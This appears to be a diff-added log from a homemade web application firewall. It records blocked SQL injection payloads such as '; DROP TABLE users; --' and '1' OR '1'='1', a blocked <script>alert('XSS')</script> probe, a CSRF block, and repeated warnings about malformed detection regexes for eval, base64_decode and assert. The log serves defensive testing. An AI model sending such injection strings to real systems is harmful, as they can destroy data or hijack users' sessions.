+[2025-04-29 08:13:11] INFO | SQLi BLOCK | severity=High | ip=122.88.44.55    🇨🇳 China, Jinrongjie           | pattern=matched-pattern | payload=user_pref='; DROP TABLE users; --
+[2025-04-29 08:13:55] INFO | SQLi BLOCK | severity=High | ip=122.88.44.55    🇨🇳 China, Jinrongjie           | pattern=matched-pattern | payload=user_pref='; DROP TABLE users; --
+[2025-04-29 08:26:31] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:26:31] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:26:31] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:33:09] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:33:09] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:33:09] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:33:12] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:33:12] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:33:12] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:35:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:35:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:35:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:35:39] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:35:39] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:35:39] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:40:44] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:40:44] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:40:44] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:41:06] DEBUG | ALLOW | total_allowed=12 | ip=122.88.44.55    | payload=Clean body
+[2025-04-29 08:41:12] DEBUG | ALLOW | total_allowed=13 | ip=122.88.44.55    | payload=Clean body
+[2025-04-29 08:41:41] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:41:41] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:41:41] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:41:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:41:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:41:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:46:40] INFO | XSS BLOCK | severity=Medium | ip=88.12.55.23     🇪🇸 Spain, Seville              | pattern=matched-pattern | payload=<script>alert('XSS')</script>
+[2025-04-29 08:49:07] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:49:07] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:49:07] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:53:56] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:53:56] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:53:56] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:53:57] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 08:53:57] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 08:53:57] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 08:54:24] INFO | XSS BLOCK | severity=Medium | ip=88.12.55.23     🇪🇸 Spain, Seville              | pattern=matched-pattern | payload=<script>alert('XSS')</script>
+[2025-04-29 09:12:24] INFO | SQLi BLOCK | severity=High | ip=51.88.66.11     🇺🇸 United States, New York     | pattern=matched-pattern | payload=1' OR '1'='1
+[2025-04-29 09:36:29] DEBUG | ALLOW | total_allowed=14 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:30] DEBUG | ALLOW | total_allowed=15 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:30] DEBUG | ALLOW | total_allowed=16 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:30] DEBUG | ALLOW | total_allowed=17 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:31] DEBUG | ALLOW | total_allowed=18 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:31] DEBUG | ALLOW | total_allowed=19 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:31] DEBUG | ALLOW | total_allowed=20 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:32] DEBUG | ALLOW | total_allowed=21 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:32] DEBUG | ALLOW | total_allowed=22 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:32] DEBUG | ALLOW | total_allowed=23 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:33] DEBUG | ALLOW | total_allowed=24 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:34] DEBUG | ALLOW | total_allowed=25 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:35] DEBUG | ALLOW | total_allowed=26 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:36:35] DEBUG | ALLOW | total_allowed=27 | ip=127.0.0.1       | payload=hello world
+[2025-04-29 09:37:57] DEBUG | ALLOW | total_allowed=28 | ip=122.88.44.55    | payload=Clean body
+[2025-04-29 09:38:01] INFO | XSS BLOCK | severity=Medium | ip=88.12.55.23     🇪🇸 Spain, Seville              | pattern=matched-pattern | payload=<script>alert('XSS')</script>
+[2025-04-29 11:22:01] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 11:22:01] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 11:22:01] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 11:22:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 11:22:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 11:22:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 11:22:55] DEBUG | ALLOW | total_allowed=29 | ip=122.88.44.55    | payload=Clean body
+[2025-04-29 11:24:56] DEBUG | ALLOW | total_allowed=30 | ip=122.88.44.55    | payload=Clean body
+[2025-04-29 11:26:15] INFO | SQLi BLOCK | severity=High | ip=122.88.44.55    🇨🇳 China, Jinrongjie           | pattern=matched-pattern | payload=ǫ'; DROP TABLE users; --
+[2025-04-29 11:26:34] INFO | SQLi BLOCK | severity=High | ip=122.88.44.55    🇨🇳 China, Jinrongjie           | pattern=matched-pattern | payload=ǫ'; DROP TABLE users; --
+[2025-04-29 11:27:21] DEBUG | ALLOW | total_allowed=31 | ip=127.0.0.1       | payload=normal data
+[2025-04-29 11:27:57] INFO | CSRF BLOCK | severity=Medium | ip=127.0.0.1       Localhost                      | pattern=missing or mismatched CSRF token; Origin/Referer not same-origin | payload=normal body but CSRF attack
+[2025-04-29 12:45:58] INFO | SQLi BLOCK | severity=High | ip=122.88.44.55    🇨🇳 China, Jinrongjie           | pattern=matched-pattern | payload=ǫ'; DROP TABLE users; --
+[2025-04-29 12:47:49] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 12:47:49] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 12:47:49] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 13:02:25] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 13:02:25] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 13:02:25] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 13:02:26] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 13:02:26] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 13:02:26] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 13:03:13] INFO | SQLi BLOCK | severity=High | ip=122.88.44.55    🇨🇳 China, Jinrongjie           | pattern=matched-pattern | payload=ǫ'; DROP TABLE users; --
